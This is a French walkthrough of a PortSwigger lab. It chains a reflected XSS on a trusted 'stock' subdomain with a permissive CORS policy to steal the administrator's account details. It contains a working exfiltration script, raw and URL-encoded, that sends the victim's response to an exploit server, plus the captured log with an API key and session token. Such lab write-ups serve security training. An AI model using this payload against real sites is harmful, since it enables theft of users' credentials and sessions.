# Lab

https://portswigger.net/web-security/cors/lab-breaking-https-attack

## Solution

Le site possède un CORS sur les sous domaines du lab.

En parcourant le site on peut voir que la vérification des stock d'un produit se fait sur le sous domaine `stock` du lab.

Par exemple : `http://stock.0afb00b60443d3b78243ab8b006b009d.web-security-academy.net/?productId=1&storeId=1`

En jouant avec cette requête on observe que le paramètre `productId` est vulnérable à une XSS puisqu'il est réfléchi dans la page.

On peut donc injecter un script qui va envoyer une requête CORS sur le sous domaine `stock` pour récupérer le stock du produit 1.

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0afb00b60443d3b78243ab8b006b009d.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='//exploit-0a6100ef04d4d3a28206aa22016000d2.exploit-server.net/logs?x='+this.responseText;
    };
</script>
```

`http://stock.0afb00b60443d3b78243ab8b006b009d.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3evar+req+%3d+new+XMLHttpRequest()%3breq.onload+%3d+reqListener%3breq.open('get','https%3a//0afb00b60443d3b78243ab8b006b009d.web-security-academy.net/accountDetails',true)%3breq.withCredentials+%3d+true%3breq.send()%3bfunction+reqListener()+{+location%3d'//exploit-0a6100ef04d4d3a28206aa22016000d2.exploit-server.net/logs%3fx%3d'%2bthis.responseText%3b}%3b%3c%2f%73%63%72%69%70%74%3e&storeId=1`

On a plus qu'à créer une redirection vers cette URL dans l'exploit serveur pour récupérer les informations de l'admin.

```html
<script>
    window.location = "http://stock.0afb00b60443d3b78243ab8b006b009d.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3evar+req+%3d+new+XMLHttpRequest()%3breq.onload+%3d+reqListener%3breq.open('get','https%3a//0afb00b60443d3b78243ab8b006b009d.web-security-academy.net/accountDetails',true)%3breq.withCredentials+%3d+true%3breq.send()%3bfunction+reqListener()+{+location%3d'//exploit-0a6100ef04d4d3a28206aa22016000d2.exploit-server.net/logs%3fx%3d'%2bthis.responseText%3b}%3b%3c%2f%73%63%72%69%70%74%3e&storeId=1";
</script>
```

Et on voit dans les logs :

`10.0.4.211      2023-10-08 23:10:44 +0000 "GET /logs?x={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22eweuQPv9dDaNKsUM7rF3Bjk7XOxN5en5%22,%20%20%22sessions%22:%20[%20%20%20%20%22Sk6GLuVI8CZd9PXnjo3XlFH6bbiIsRt4%22%20%20]} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"`

Soit en JSON propre :

```json
{
  "username": "administrator",
  "email": "",
  "apikey": "eweuQPv9dDaNKsUM7rF3Bjk7XOxN5en5",
  "sessions": [
    "Sk6GLuVI8CZd9PXnjo3XlFH6bbiIsRt4"
  ]
}
```

On a plus qu'à submit le challenge avec l'apikey de l'admin.